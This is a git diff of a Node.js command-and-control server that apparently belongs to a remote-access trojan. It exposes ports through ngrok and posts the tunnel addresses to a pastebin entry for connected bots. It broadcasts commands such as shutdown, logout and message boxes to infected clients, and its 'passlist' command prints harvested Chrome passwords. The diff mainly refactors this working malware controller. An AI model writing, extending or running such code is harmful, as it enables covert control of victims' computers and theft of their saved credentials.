@@ -1,4 +1,6 @@
 var net = require('net');
+//var capnp = require ('capnp');
+require('log-timestamp');
 var readline = require('readline');
 var ngrok = require('ngrok');
 var paste = require("better-pastebin");
@@ -6,6 +8,12 @@ var paste = require("better-pastebin");
 //var db = new sqlite3.Database("userdata.db");
 var colors = require('colors');
 //var CryptoJS = require('crypto-js');
+
+// var fs = require("fs")
+// var p = require("node-protobuf") // note there is no .Protobuf part anymore
+// // WARNING: next call will throw if desc file is invalid
+// var pb = new p(fs.readFileSync("./buffer.proto")) // obviously you can use async methods, it's for simplicity reasons
+
 
 
 /*var blessed = require('blessed');
@@ -80,7 +88,7 @@ net.createServer(function (socket) {
 net.createServer(function (socket) {
     socket.on('data', function (data) {
       sendCommand(data);
-      console.log("Recived cmd from 8000\n".america);
+      console.log("Recived cmd from 8000".america);
       clients.forEach(function (client) {
           if (client.nick !== "undefined") {
               socket.write(client.nick + " \n");
@@ -115,12 +123,12 @@ function getPublicIP() {
   //Get url and links it to port 4434, then save to pastebin
   ngrok.connect({proto: 'tcp', addr: 4434, region: 'eu'}, function (err, url) {
           console.log("NGrok Url:  ".green + url.blue);
-          updatePastebin(url)
+      updatePastebin(url);
       }
   );
   ngrok.connect({proto: 'tcp', addr: 8000, region: 'eu'}, function (err, url) {
           console.log("NGrok Url boss:  ".green + url.blue);
-          updatePastebinBoss(url)
+      updatePastebinBoss(url);
       }
   );
 
@@ -132,14 +140,30 @@ function getPublicIP() {
 }
 
 function sendCommand(command) {
-    if (command === "users") names.forEach(function (name) { console.log(name + " "); });
-    else if (command == "help") console.log("Usage: [command] [target (* for all)] [argumets (spaces are -)]\nmsg: ok messagebox\nlo: logs out\noff: shutdowns pc\nyn: yes or no message\nweb: opens");
-    else if (command == "passlist") console.log(chromePasswords);
-    else {
+    switch (command) {
+    case 'help':
+        console.log("Usage: [command] [target (* for all)] [argumets (spaces are -)]\n");
+        break;
+    case 'users':
+        console.log(users);
+        break;
+
+    case 'passlist':
+        console.log(chromePasswords);
+        break;
+
+    default:
         if (command != "" && command != "\n") {
             clients.forEach(function (client) {
                 //Add syntax check
                 client.write(command + " \n");
+                // var obj = {
+                //     'command':command.split(" ")[0],
+                //     'aguments': command,
+                //     'target': comamnd.split(" ")[1]
+                // };
+                // client.write(pb.serialize(obj, "Data"));
+                // var newObj = pb.parse(buf, "Data") // you get plain object here, it should be exactly the same as obj
             });
         }
     }
@@ -152,7 +176,6 @@ function savePassToSQLite(url, username, password) {
         stmt.finalize();
     });
 }*/
-
 function updatePastebin(text) {
     paste.edit("BuG97BSk", text, function (success, data) {
       if (success) {
